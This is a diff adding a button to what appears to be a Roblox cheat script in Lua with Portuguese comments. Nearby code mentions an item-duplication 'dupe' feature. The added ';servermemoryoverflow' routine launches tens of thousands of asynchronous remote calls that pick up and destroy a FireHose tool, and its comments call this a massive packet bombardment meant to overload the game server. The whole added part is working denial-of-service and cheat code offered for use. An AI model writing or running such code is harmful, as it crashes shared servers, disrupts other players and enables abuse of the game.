@@ -754,4 +754,48 @@ MainTab:CreateButton({
             pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Finalizando processo...", Button1 = "Ok", Duration = 5 }) end)
         end,
     })
+
+    MainTab:CreateButton({
+            Name = ";servermemoryoverflow",
+            Callback = function()
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local backpack = LocalPlayer:WaitForChild("Backpack")
+        local remoteStorage = ReplicatedStorage:WaitForChild("RE")
+        
+        local toolRemote = remoteStorage:FindFirstChild("1Too1l")
+        
+        if toolRemote and toolRemote:IsA("RemoteFunction") then
+            -- Argumentos pré-definidos fora do loop para otimização de memória
+            local args1 = { "PickingTools", "FireHose" }
+            local args2 = { "FireHose", "DestroyFireHose" }
+            
+            -- Multiplicador de threads para bombardeio massivo de pacotes de rede
+            for i = 1, 30 do 
+                task.spawn(function()
+                    for m = 1, 2000 do
+                        -- Cria uma micro-thread dedicada para NÃO esperar o retorno do InvokeServer
+                        task.spawn(function()
+                            pcall(function()
+                                toolRemote:InvokeServer(unpack(args1))
+                            end)
+                        end)
+                        
+                        -- Dispara a destruição na mochila de forma independente e assíncrona
+                        task.spawn(function()
+                            local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose")
+                            if fireHose then
+                                local toolSound = fireHose:FindFirstChild("ToolSound")
+                                if toolSound then
+                                    pcall(function()
+                                        toolSound:FireServer(unpack(args2))
+                                    end)
+                                end
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+    end,
+})
 end
